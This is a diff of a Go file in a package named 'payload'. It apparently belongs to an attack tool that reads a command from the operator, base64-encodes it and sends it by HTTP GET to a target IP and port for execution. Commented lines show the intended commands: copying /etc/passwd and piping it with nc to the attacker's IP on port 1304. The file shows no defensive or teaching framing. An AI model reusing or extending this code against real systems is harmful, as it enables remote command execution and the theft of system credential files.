@@ -1,13 +1,13 @@
 package payload
 
 import (
-	// "bufio"
-	// "os"
+	"bufio"
 	"encoding/base64"
 	"fmt"
 	"io/ioutil"
 	"myapp/lib/sysinfo"
 	"net/http"
+	"os"
 	"time"
 )
 
@@ -24,12 +24,12 @@ func PayloadInput() {
 	fmt.Println("Testing curl...")
 	for {
 		fmt.Println("Enter the payload command:")
-		// scanner := bufio.NewScanner(os.Stdin)
-		// if scanner.Scan() {
-		// 	payloadcmd = scanner.Text()
-		// }
+		scanner := bufio.NewScanner(os.Stdin)
+		if scanner.Scan() {
+			payloadcmd = scanner.Text()
+		}
 		// payloadcmd = "cat /etc/passwd > /tmp/passwd.txt && nc " + sourceip.String() + " 1304 < /tmp/passwd.txt"
-		payloadcmd = "cat /etc/passwd > /tmp/passwd.txt"
+		// payloadcmd = "cat /etc/passwd > /tmp/passwd.txt"
 		encodedpayloadcmd := base64.StdEncoding.EncodeToString([]byte(payloadcmd))
 		targeturl := "http://" + targetip + ":" + targetport
 		req, err := http.NewRequest(("GET"), targeturl, nil)
